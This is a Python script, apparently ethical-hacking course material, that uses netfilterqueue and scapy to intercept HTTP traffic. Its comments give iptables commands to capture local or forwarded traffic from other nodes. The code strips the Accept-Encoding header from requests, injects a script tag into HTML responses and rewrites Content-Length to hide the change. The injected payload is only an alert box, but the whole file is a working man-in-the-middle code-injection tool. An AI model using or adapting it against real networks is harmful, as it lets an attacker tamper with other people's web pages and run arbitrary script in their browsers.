#!/usr/bin/env python
#Terminal command to test on local machine: iptables -I OUTPUT -j NFQUEUE --queue-num 0
#Terminal command to test on local machine: iptables -I INPUT -j NFQUEUE --queue-num 0
#Terminal commmand to test on other nodes: iptables -I FORWARD -j NFQUEUE --queue-num 0
#Remove IP Table rules: iptables --flush
import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request: ")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)





        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response: ")
            #print(scapy_packet.show())
            injection_code = "<script>alert('Hello');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))


        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

            #print(scapy_packet.show)








    packet.accept()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n\n[+] Good Bye")
